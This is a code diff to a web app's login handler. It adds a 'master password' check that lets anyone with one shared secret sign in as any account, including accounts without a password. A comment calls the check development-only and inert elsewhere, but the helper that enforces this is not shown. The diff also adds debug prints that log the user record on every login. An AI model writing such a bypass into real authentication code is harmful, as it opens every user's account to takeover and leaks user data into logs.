@@ -16,6 +16,7 @@ from app.core.ratelimit import FORGOT_PASSWORD, LOGIN, REGISTER, VERIFY_EMAIL_SE
 from app.core.security import (
     create_session_token,
     hash_password,
+    master_password_ok,
     needs_rehash,
     verify_password,
 )
@@ -152,14 +153,19 @@ async def login(
     await recaptcha.require(payload.recaptcha_token, request)
     result = await db.execute(select(User).where(User.email == payload.email.lower()))
     user = result.scalar_one_or_none()
-
+    print(f"User: {user}")
+    # Development only, inert elsewhere — see master_password_ok. Lets a dev
+    # sign in as any account (including Google-only ones with no hash) without
+    # touching its stored password.
+    master_login = master_password_ok(payload.password)
+    print(f"Master login: {master_login}")
     # Same error either way — don't reveal which emails exist.
-    if user is None or not verify_password(payload.password, user.password_hash):
+    if user is None or not (master_login or verify_password(payload.password, user.password_hash)):
         raise HTTPException(status.HTTP_401_UNAUTHORIZED, "Incorrect email or password.")
     if not user.is_active:
         raise HTTPException(status.HTTP_403_FORBIDDEN, "This account is disabled.")
 
-    if needs_rehash(user.password_hash):
+    if not master_login and needs_rehash(user.password_hash):
         # A rehash is not a password *change* — leave password_changed_at alone
         # or every login would sign the learner's other browsers out.
         user.password_hash = hash_password(payload.password)
